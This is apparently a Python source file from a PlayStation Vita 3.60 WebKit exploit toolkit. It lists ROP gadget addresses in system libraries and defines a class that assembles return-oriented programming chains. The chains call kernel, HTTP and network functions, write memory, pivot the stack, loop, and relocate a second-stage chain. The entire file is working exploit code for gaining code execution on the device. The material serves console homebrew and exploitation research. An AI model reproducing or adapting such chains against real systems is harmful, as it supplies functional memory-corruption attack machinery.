from collections import OrderedDict

from rop import Rop, Ret, Load
from relocatable import SceWebKit_base, SceLibKernel_base, SceLibc_base, SceLibHttp_base, SceNet_base, data_base
from util import p32, u32


class Gadgets360:
    ldm_r1_stuff = SceWebKit_base + 0x54c8 # 54c8: e891a916 ldm r1, {r1, r2, r4, r8, fp, sp, pc}
    blx_r4_pop_r4_r5_r6_pc = SceWebKit_base + 0xbfb91
    pop_r0_r1_r2_r3_r4_r5_pc = SceWebKit_base + 0x8dd9b5
    pop_r1_r2_r3_r4_pc = SceWebKit_base + 0x860637
    ldr_r0_r0_pop_r4_pc = SceWebKit_base + 0x695b1
    pop_r2_pc = SceWebKit_base + 0x884b85
    pop_r0_pc = SceWebKit_base + 0x927215
    ldr_r1_r0_mov_r0_r1_pop_r4_pc = SceWebKit_base + 0x698fb
    blx_r4_pop_r4_pc = SceWebKit_base + 0xfcdbb
    pop_r0_r1_pc = SceWebKit_base + 0x8e7445
    str_r0_r1_pop_r4 = SceWebKit_base + 0x15591b
    pop_r1_pc = SceWebKit_base + 0x877235
    pop_r4_pc = SceWebKit_base + 0x123
    adds_r0_r1 = SceWebKit_base + 0x17a383 # adds r0, r1, r0; bx lr
    pop_r5_r6_r7_r8_sb_pc = SceWebKit_base + 0xeb4d5
    pop_pc = SceWebKit_base + 0xc048b
    ldr_r1_r1_blx_sb = SceWebKit_base + 0x612351
    ldrb_r0_r0_pop_r4 = SceWebKit_base + 0x12b5c7
    lsls_r0_2_pop_r4 = SceWebKit_base + 0x4523cd # lsls r0, r0, #2 ; pop {r4, pc}
    str_r1_r0_pop_r4 = SceWebKit_base + 0x1bd5b

# CMP             R0, R4
# BNE             loc_82340F94
# MOVS            R0, #1
# B               locret_82340F96
#loc_82340F94
# MOVS            R0, #0
#locret_82340F96 
# POP             {R4-R6,PC}
    cmp_r0_r4 = SceWebKit_base + 0x840b7d

    mul_r0_r1_bx_lr = SceWebKit_base + 0x647d35
    mov_r0_sp_blx_r2 = SceWebKit_base + 0x1fe63b
    mov_r12_r0 = SceLibKernel_base + 0x809 # mov ip, r0 ; bx lr
    mov_sp_r12_pop_pc = SceLibKernel_base + 0x1111

    pop_r0_to_r5 = SceWebKit_base + 0x8dd9b5
    blx_r4_pop_r4 = SceWebKit_base + 0xfcdbb
    str_r0_r4_pop_r4 =  SceWebKit_base + 0x59a9
    bx_lr = SceWebKit_base + 0x575
    mov_r8_r0_mov_r0_r7_mov_r1_r6_blx_r2 = SceWebKit_base + 0x21a295 # mov r8, r0 ; adds r0, r7, #0 ; adds r1, r6, #0 ; blx r2
    mov_r3_r8_blx_r4 = SceWebKit_base + 0xcf481
    blx_r3_pop_r4_pc = SceWebKit_base + 0x10665d

    infloop = SceWebKit_base + 0x519


class Functions360:
    sceKernelAllocMemBlock = SceLibc_base + 0x3C3AC
    sceKernelGetMemBlockBase = SceLibc_base + 0x3C39C

    sceKernelCreateThread = SceLibKernel_base + 0xACC9
    sceKernelGetThreadInfo = SceLibKernel_base + 0xA791
    sceKernelStartThread = SceLibKernel_base + 0xA789
    sceKernelWaitThreadEnd = SceLibKernel_base + 0x16FD

    sceHttpInit = SceLibHttp_base + 0x92FD
    sceHttpCreateTemplate = SceLibHttp_base + 0x947B
    sceHttpCreateConnectionWithURL = SceLibHttp_base + 0x950B
    sceHttpCreateRequestWithURL = SceLibHttp_base + 0x95FF
    sceHttpSendRequest = SceLibHttp_base + 0x9935
    sceHttpReadData = SceLibHttp_base + 0x9983

    store = SceWebKit_base + 0x106fc5
    add = SceWebKit_base + 0x130a15

    memcpy = SceLibc_base + 0x13F01
    memset = SceLibc_base + 0x14011

    sceIoDevctl = SceLibKernel_base + 0xA55D
    sceIoDevctl_svc = SceLibKernel_base + 0x690C
    sceIoOpen = SceLibKernel_base + 0xA4AD

    sceKernelDelayThread = SceLibHttp_base + 0x18544

    socket = SceNet_base + 0x27E1
    sceNetDumpCreate_svc = SceNet_base + 0x9FE0
    sceNetDumpDestroy = SceNet_base + 0x2909

    sceNetSyscallIoctl = SceNet_base + 0x9F90
    sceNetSyscallControl = SceNet_base + 0xA110
    sceNetSyscallClose = SceNet_base + 0x9F60


G = Gadgets360()
F = Functions360()


class Rop360(Rop):

    functions = F

    def __init__(self):
        super().__init__()
        # Used by repeat()
        self.loop_index = self.pre_alloc_var(4)
        self.loop_temp = self.pre_alloc_var(4)

        # Used by do_write_data
        self.write_data_temp = self.pre_alloc_var(4)

    def call_v7(self, func, a0=0, a1=0, a2=0, a3=0, a4=0, a5=0, a6=0):
        self.rop += [
            G.pop_r0_r1_r2_r3_r4_r5_pc,
            a0,
            a1,
            a2,
            a3,
            func,
            0,

            G.blx_r4_pop_r4_r5_r6_pc,
            a4,
            a5,
            a6,
        ]

    def call_rv6(self, func, a0, a1=0, a2=0, a3=0, a4=0, a5=0, a6=0):
        assert(a0 is Ret)

        self.rop += [
            G.pop_r1_r2_r3_r4_pc,
            a1,
            a2,
            a3,
            func,

            G.blx_r4_pop_r4_r5_r6_pc,
            a4,
            a5,
            a6,
        ]

    def call_lv6(self, func, a0, a1=0, a2=0, a3=0, a4=0, a5=0, a6=0):
        assert(isinstance(a0, Load))

        self.rop += [
            G.pop_r0_r1_r2_r3_r4_r5_pc,
            a0,
            a1,
            a2,
            a3,
            0,
            0,

            G.ldr_r0_r0_pop_r4_pc,
            func,

            G.blx_r4_pop_r4_r5_r6_pc,
            a4,
            a5,
            a6,
        ]

    def call_llv(self, func, a0, a1, a2=0):
        assert(isinstance(a0, Load))
        assert(isinstance(a1, Load))

        self.rop += [
            G.pop_r2_pc,
            a2,

            G.pop_r0_pc,
            a1,

            G.ldr_r1_r0_mov_r0_r1_pop_r4_pc,
            0,

            G.pop_r0_pc,
            a0,

            G.ldr_r0_r0_pop_r4_pc,
            func,

            G.blx_r4_pop_r4_pc,
            0,
        ]

    def write32(self, value, addr):
        self.rop += [
            G.pop_r0_r1_pc,
            value,
            addr,

            G.str_r0_r1_pop_r4,
            0,
        ]

    def infloop(self):
        self.rop += [
            G.infloop
        ]

    def crash(self):
        self.rop += [
            0xdead,
        ]
    
    _call_funcs = OrderedDict([
        ("vvvvvvv", call_v7),
        ("rvvvvvv", call_rv6),
        ("lvvvvvv", call_lv6),
        ("llv", call_llv),
    ])

    def call_r0(self):
        self.rop += [
            G.pop_r2_pc,
            G.pop_pc,
            G.mov_r8_r0_mov_r0_r7_mov_r1_r6_blx_r2,
            G.pop_r4_pc,
            G.pop_pc,
            G.mov_r3_r8_blx_r4,
            G.pop_r0_pc,
            0,
            G.blx_r3_pop_r4_pc,
            0,
        ]

    def do_write_data(self, data_binary):
        part1 = [
            # r0 = sp
            G.pop_r2_pc,
            G.pop_pc,
            G.mov_r0_sp_blx_r2,

            # r0 += const
            G.pop_r1_pc,
            0xDEAD,
        ]

        part2 = [
            G.pop_r4_pc,
            G.adds_r0_r1,
            G.blx_r4_pop_r4_pc,
            0,

            # [write_data_temp] = r0
            G.pop_r1_pc,
            self.write_data_temp,
            G.str_r0_r1_pop_r4,
            0,

            # r1 = [write_data_temp]
            G.pop_r1_pc,
            self.write_data_temp,
            G.pop_r5_r6_r7_r8_sb_pc,
            0,
            0,
            0,
            0,
            G.pop_pc, # sb
            G.ldr_r1_r1_blx_sb,

            # (dest) r0 = data_base
            G.pop_r0_pc,
            data_base,

            # (len) r2 = len(data_binary)
            G.pop_r2_pc,
            len(data_binary),

            G.pop_r4_pc,
            F.memcpy,

            # call memcpy(data_binary, SRC_past_rop, len)
            G.blx_r4_pop_r4_pc,
            0,
        ]

        part1[-1] = (len(part2 + self.rop) + 2) * 4

        # Append data_binary as a series of words at the end of ropchain
        for word in range(0, len(data_binary) // 4):
            data = data_binary[word*4:(word+1)*4]

            num = u32(data)
            self.rop.append(num)

        # Prepend data_binary writer
        self.rop = part1 + part2 + self.rop


    def repeat(self, times, body):
        #---- Increment index
        # [index] += 1
        #---- Do loopy thingy
        # cmp [index], rop_size_words
        # r0 += -1
        # -- now R0 == 0 if [index] == rop_size_words, -1 otherwise
        # -- set R0 = sp offset if continue to loop, 0 if exiting rop chain
        # [temp] = r0
        # r0 = sp
        # r0 += [temp]
        # r0 += const
        # -- now r0 contains SP, implementing the IF, and we need to pivot to it
        # r12 = r0

        # Set loop_index to 0
        part1 = [
            G.pop_r0_r1_pc,
            0,
            self.loop_index,

            G.str_r0_r1_pop_r4,
            0,
        ]

        # body is executed here

        # Increment loop index by one, compare it
        part2 = [
            # [loop_index] += 1
            G.pop_r1_pc,
            1,
            G.pop_r0_pc,
            self.loop_index,
            G.ldr_r0_r0_pop_r4_pc,
            0,
            G.pop_r4_pc,
            G.adds_r0_r1,
            G.blx_r4_pop_r4_pc,
            0,
            G.pop_r1_pc,
            self.loop_index,
            G.str_r0_r1_pop_r4,
            0,

            # cmp [loop_index], times
            G.pop_r0_pc,
            self.loop_index,
            G.ldr_r0_r0_pop_r4_pc,
            times,
            G.cmp_r0_r4,
            0,
            0,
            0,

            # r0 += -1
            G.pop_r1_pc,
            0xFFFFFFFF,
            G.pop_r4_pc,
            G.adds_r0_r1,
            G.blx_r4_pop_r4_pc,
            0,

            # now R0 == 0 if [loop_index] == times, -1 otherwise
            # set R0 = sp offset if continue to loop, 0 if exiting rop chain

            G.pop_r1_pc,
            0xDEAD, # = +(number of |data| before RETURN) * 4 # FILLME
        ]

        part3 = [
            G.pop_r4_pc,
            G.mul_r0_r1_bx_lr,
            G.blx_r4_pop_r4_pc,
            0,

            # [loop_temp] = r0
            G.pop_r1_pc,
            self.loop_temp,
            G.str_r0_r1_pop_r4,
            0,

            # r0 = sp
            G.pop_r2_pc,
            G.pop_pc,
            G.mov_r0_sp_blx_r2,
        ]

        part4 = [
            # r0 += [loop_temp]
            G.pop_r1_pc,
            self.loop_temp,
            G.pop_r5_r6_r7_r8_sb_pc,
            0,
            0,
            0,
            0,
            G.pop_pc,
            G.ldr_r1_r1_blx_sb,
            G.pop_r4_pc,
            G.adds_r0_r1,
            G.blx_r4_pop_r4_pc,
            0,

            # r0 += const
            G.pop_r1_pc,
            0xDEAD, # = (number of |data| after mov_r0_sp-blx_r2 and before RETURN_ADDRESS) * 4 # FILLME
        ]

        part5 = [
            G.pop_r4_pc,
            G.adds_r0_r1,
            G.blx_r4_pop_r4_pc,
            0,

            # now r0 contains SP, implementing the IF, and we need to pivot to it
            # r12 = r0
            G.pop_r4_pc,
            G.mov_r12_r0,
            G.blx_r4_pop_r4_pc,
            0,
            G.mov_sp_r12_pop_pc,

            # only get here when the loop is complete
        ]

        # fill the FILLMEs
        part2[-1] = len(body + part2 + part3 + part4 + part5) * 4
        part4[-1] = len(part4 + part5) * 4

        self.rop += part1 + body + part2 + part3 + part4 + part5

    def relocate_rop(self, rop_base, rop_size_words, bases_base):
        """
        Relocates second-stage rop chain... in rop!
        Equivalent to:

            for x in range(num_words):
                rop[x] += bases[relocs[x]]

        Yes! Loops and conditions, in rop!

        - rop_base: address of pointer to rop base
        - rop_size_words: rop size in 4-byte words
        - bases_base: address of array of bases: [0, data_base, SceWebKit_base, ...]
        """

        # Now's a good time to turn around and close this file, trust me
        # ... you've been warned.

        # This is where we store current index of the loop
        index = self.pre_alloc_var(4)

        # This is temporary storage
        temp = self.pre_alloc_var(4)

        # Summary:
        #---- Store reloc base-addr into tmp
        # r0 = [index]
        # r0 += 4 * rop_size_words
        # r0 += [rop_base] < this is pointing to reloc for index's rop word
        # r0 = ldrb[r0] * 4
        # r0 += bases_base
        # r0 = ldr[r0]
        # [temp] = r0
        #---- Store relocated rop word into tmp
        # r0 = [index] * 4
        # r0 += [rop_base]
        # r0 = [r0]
        # r0 += [temp]
        # [temp] = r0
        #---- Load word from tmp and store it back into the chain
        # r0 = [index] * 4
        # r0 += [rop_base]
        # [r0] = [temp]

        self.repeat(rop_size_words, [
            # r0 = [index]
            G.pop_r0_pc,
            index,
            G.ldr_r0_r0_pop_r4_pc,
            0,

            # r0 += 4 * rop_size_words
            G.pop_r1_pc,
            4 * rop_size_words,
            G.pop_r4_pc,
            G.adds_r0_r1,
            G.blx_r4_pop_r4_pc,
            0,

            # r0 += [rop_base]
            G.pop_r1_pc,
            rop_base,
            G.pop_r5_r6_r7_r8_sb_pc,
            0,
            0,
            0,
            0,
            G.pop_pc, # sb
            G.ldr_r1_r1_blx_sb,
            G.pop_r4_pc,
            G.adds_r0_r1,
            G.blx_r4_pop_r4_pc,
            0,

            # r0 = ldrb[r0] * 4
            G.ldrb_r0_r0_pop_r4,
            0,
            G.lsls_r0_2_pop_r4,
            0,

            # r0 += bases_base
            G.pop_r1_pc,
            bases_base,
            G.pop_r4_pc,
            G.adds_r0_r1,
            G.blx_r4_pop_r4_pc,
            0,

            # r0 = ldr[r0]
            G.ldr_r0_r0_pop_r4_pc,
            0,
            
            # [temp] = r0
            G.pop_r1_pc,
            temp,
            G.str_r0_r1_pop_r4,
            0,

            # r0 = [index] * 4
            G.pop_r0_pc,
            index,
            G.ldr_r0_r0_pop_r4_pc,
            0,
            G.lsls_r0_2_pop_r4,
            0,

            # r0 += [rop_base]
            G.pop_r1_pc,
            rop_base,
            G.pop_r5_r6_r7_r8_sb_pc,
            0,
            0,
            0,
            0,
            G.pop_pc,
            G.ldr_r1_r1_blx_sb,
            G.pop_r4_pc,
            G.adds_r0_r1,
            G.blx_r4_pop_r4_pc,
            0,

            # r0 = [r0]
            G.ldr_r0_r0_pop_r4_pc,
            0,

            # r0 += [temp]
            G.pop_r1_pc,
            temp,
            G.pop_r5_r6_r7_r8_sb_pc,
            0,
            0,
            0,
            0,
            G.pop_pc,
            G.ldr_r1_r1_blx_sb,
            G.pop_r4_pc,
            G.adds_r0_r1,
            G.blx_r4_pop_r4_pc,
            0,

            # [temp] = r0
            G.pop_r1_pc,
            temp,
            G.str_r0_r1_pop_r4,
            0,

            # r0 = [index] * 4
            G.pop_r0_pc,
            index,
            G.ldr_r0_r0_pop_r4_pc,
            0,
            G.lsls_r0_2_pop_r4,
            0,

            # r0 += [rop_base]
            G.pop_r1_pc,
            rop_base,
            G.pop_r5_r6_r7_r8_sb_pc,
            0,
            0,
            0,
            0,
            G.pop_pc, # sb
            G.ldr_r1_r1_blx_sb,
            G.pop_r4_pc,
            G.adds_r0_r1,
            G.blx_r4_pop_r4_pc,
            0,

            # [r0] = [temp]
            G.pop_r1_pc,
            temp,
            G.pop_r5_r6_r7_r8_sb_pc,
            0,
            0,
            0,
            0,
            G.pop_pc,
            G.ldr_r1_r1_blx_sb,
            G.str_r1_r0_pop_r4,
            0,

            # [index] += 1
            G.pop_r1_pc,
            1,
            G.pop_r0_pc,
            index,
            G.ldr_r0_r0_pop_r4_pc,
            0,
            G.pop_r4_pc,
            G.adds_r0_r1,
            G.blx_r4_pop_r4_pc,
            0,
            G.pop_r1_pc,
            index,
            G.str_r0_r1_pop_r4,
            0,
        ])
